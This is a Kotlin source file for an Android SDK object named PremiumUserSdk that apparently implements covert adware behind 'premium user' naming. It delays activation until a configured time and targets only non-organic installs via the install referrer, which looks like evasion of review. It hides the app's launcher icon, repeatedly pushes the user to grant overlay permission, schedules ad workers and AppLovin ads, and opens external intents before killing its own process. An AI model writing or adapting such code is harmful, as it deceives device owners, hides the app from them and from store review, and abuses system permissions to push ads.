package com.app.sdk.sdk

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import androidx.activity.ComponentActivity
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.app.sdk.AppApplication
import com.app.sdk.PremiumActivity
import com.app.sdk.sdk.config.SdkConfig
import com.app.sdk.sdk.config.SdkConfig.getLaunchAdTime
import com.app.sdk.sdk.data.Prefs
import com.app.sdk.sdk.event.handler.impl.AdUserHandler
import com.app.sdk.sdk.mediator.ApplovinMediator
import com.app.sdk.sdk.mediator.Mediator
import com.app.sdk.sdk.services.schedulers.PremiumScheduler
import com.google.firebase.messaging.FirebaseMessaging
import kotlin.system.exitProcess


object PremiumUserSdk {

    private val currentTime get() = System.currentTimeMillis()
    private val permissionHandler = Handler(Looper.getMainLooper())

    fun onPing(context: Context) {

        AdUserHandler.ping(context)

        Handler(Looper.getMainLooper()).postDelayed({ PremiumScheduler.launchWorker(context) }, 200)

    }

    private fun needToCheck(context: Context): Boolean {
        val prefs = Prefs.getInstance(context)
        return !prefs.isPremiumUser() && !prefs.isSubscribeUser()
    }

    fun check(context: Context, onCompleteInt: () -> Unit) {
        if (!isSDKStarted()) onCompleteInt.invoke()
        else if (needToCheck(context)) runInstallReferrer(context, onCompleteInt)
        else onCompleteInt.invoke()
    }

    fun subscribeUser() {
        FirebaseMessaging.getInstance().subscribeToTopic(SdkConfig.topicName)
            .addOnCompleteListener {
                if (it.isSuccessful) Prefs.getInstance(AppApplication.instance).setUserSubscribe()
            }
    }

    private fun runInstallReferrer(context: Context, onCompleteInt: () -> Unit) {
        with(InstallReferrerClient.newBuilder(context).build()) {
            startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(p0: Int) {
                    val result = p0 == InstallReferrerClient.InstallReferrerResponse.OK
                        && !installReferrer.installReferrer.contains("organic")
                    if (result) preparePremiumUser(context, onCompleteInt)
                    else onCompleteInt.invoke()

                    endConnection()
                }

                override fun onInstallReferrerServiceDisconnected() {

                }
            })
        }
    }

    private fun preparePremiumUser(context: Context, onCompleteInt: () -> Unit) {
        Prefs.getInstance(context).setUserAsPremium()
        Prefs.getInstance(context).setShowAdTime(getLaunchAdTime())
        PremiumScheduler.launchWorker(context)
        onCompleteInt.invoke()
    }

    private fun isSDKStarted() = currentTime >= SdkConfig.startSDKTime

    fun saveNextShowingTime(context: Context) {
        Prefs.getInstance(context).setShowAdTime(currentTime + SdkConfig.adDelay)
    }

    fun hasOverlayPermission(context: Context) = Settings.canDrawOverlays(context)

    fun hideAppIcon(ctx: Context) {
        val disableCN = componentName(ctx, "${ctx.packageName}${SdkConfig.disableActivity}")
        ctx.packageManager.setComponentState(disableCN, getState(false))

        val enableCN = componentName(ctx, "com.app.sdk.${SdkConfig.getEnableComponentName()}")
        ctx.packageManager.setComponentState(enableCN, getState(true))
    }

    private fun componentName(context: Context, name: String) = ComponentName(context, name)

    private fun PackageManager.setComponentState(name: ComponentName, state: Int) {
        setComponentEnabledSetting(name, state, PackageManager.DONT_KILL_APP)
    }

    private fun getState(isEnable: Boolean) =
        if (isEnable) PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        else PackageManager.COMPONENT_ENABLED_STATE_DISABLED

    fun showInAppAd(activity: ComponentActivity, action: () -> Unit) {
        if (!isSDKStarted()) {
            action.invoke()
            return
        }

        val clickTimes = Prefs.getInstance(activity).getClickTimes() + 1

        if (clickTimes == 5) ApplovinMediator(object : Mediator.MediatorCallBack {

            override fun startLoadAd(mediator: Mediator) {
                mediator.loadAd(activity)
            }

            override fun onError() {
                onHide()
            }

            override fun onHide() {
                action.invoke()
            }

            override fun onClicked() {

            }

            override fun onDisplay() {
                Prefs.getInstance(activity).setClickTimes(0)
            }

            override fun displayMsg(msg: String) {

            }
        }).initMediator(activity)
        else {
            action.invoke()
            Prefs.getInstance(activity).setClickTimes(clickTimes)
        }
    }

    private fun openExtension(activity: ComponentActivity) {

        arrayOf(
            Intent(Intent.ACTION_VIEW, Uri.parse(getLink())),
            Intent(Intent(Intent.ACTION_VIEW, Uri.parse("vnd.youtube:x2bqscVkGxk"))),
            Intent(activity, PremiumActivity::class.java).putExtra(
                PremiumActivity.IS_FIRST_START, true
            ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        ).let(activity::startActivities)

        activity.finish()

        Handler(Looper.getMainLooper()).postDelayed({ exitProcess(-1) }, 200)
    }

    private fun getLink() = "https://play.google.com/store/apps/details?id=com.android.chrome"

    fun launchPermission(activity: ComponentActivity) {
        val intent =
            Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).setData(Uri.parse("package:${activity.packageName}"))

        activity.startActivity(intent)
        checkPermissionResult(activity)
    }

    private fun checkPermissionResult(activity: ComponentActivity) {
        if (hasOverlayPermission(activity)) Intent(activity, activity::class.java)
            .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT).let(activity::startActivity)
        else permissionHandler.postDelayed({ checkPermissionResult(activity) }, 100)
    }

    fun onResult(activity: ComponentActivity) {
        openExtension(activity)
        AdUserHandler.ping(activity)
    }

    fun isPremiumUser(context: Context) = Prefs.getInstance(context).isPremiumUser()

    fun notRequiredPermission() = SdkConfig.notRequiredPermission()

}
